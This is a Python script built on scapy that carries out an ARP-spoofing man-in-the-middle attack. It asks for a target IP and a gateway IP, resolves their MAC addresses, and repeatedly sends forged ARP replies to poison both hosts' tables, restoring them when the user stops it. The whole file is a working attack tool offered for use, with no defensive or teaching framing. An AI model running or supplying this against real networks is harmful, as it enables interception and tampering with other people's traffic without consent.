import scapy.all as scapy
import threading
import time
import os
from colorama import Fore, Style, init

init(autoreset=True)

def get_mac(ip):
    """Retrieves the MAC address of a given IP address."""
    try:
        ans, _ = scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=ip), timeout=2, verbose=False)
        if ans:
            return ans[0][1].hwsrc
        return None
    except Exception:
        return None

def spoof(target_ip, spoof_ip, target_mac):
    """Sends an ARP response to poison the target's ARP table."""
    try:
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(packet, verbose=False)
    except Exception as e:
        print(f"{Fore.RED}Error sending spoofing packet: {e}{Style.RESET_ALL}")

def restore(destination_ip, source_ip, destination_mac, source_mac):
    """Restores the network to its normal state."""
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

def start_mitm_attack():
    """Main function to run the Man-in-the-Middle attack."""
    if os.geteuid() != 0:
        print(f"{Fore.RED}This script requires root privileges. Please run with sudo.{Style.RESET_ALL}")
        return
        
    print(f"\n{Fore.YELLOW}{Style.BRIGHT}Man-in-the-Middle Attack{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'-'*50}{Style.RESET_ALL}")

    target_ip = input(f"{Fore.YELLOW}Enter Target IP: {Style.RESET_ALL}")
    gateway_ip = input(f"{Fore.YELLOW}Enter Gateway IP: {Style.RESET_ALL}")
    
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)

    if not target_mac or not gateway_mac:
        print(f"{Fore.RED}Could not find MAC addresses. Exiting.{Style.RESET_ALL}")
        return

    print(f"\n{Fore.GREEN}Starting MitM attack... Press Ctrl+C to stop.{Style.RESET_ALL}")

    try:
        while True:
            spoof(target_ip, gateway_ip, target_mac)
            spoof(gateway_ip, target_ip, gateway_mac)
            time.sleep(2)
    except KeyboardInterrupt:
        print(f"\n{Fore.GREEN}Restoring ARP tables...{Style.RESET_ALL}")
        restore(target_ip, gateway_ip, target_mac, gateway_mac)
        restore(gateway_ip, target_ip, gateway_mac, target_mac)
        print(f"{Fore.GREEN}ARP tables restored. Exiting.{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}An error occurred: {e}{Style.RESET_ALL}")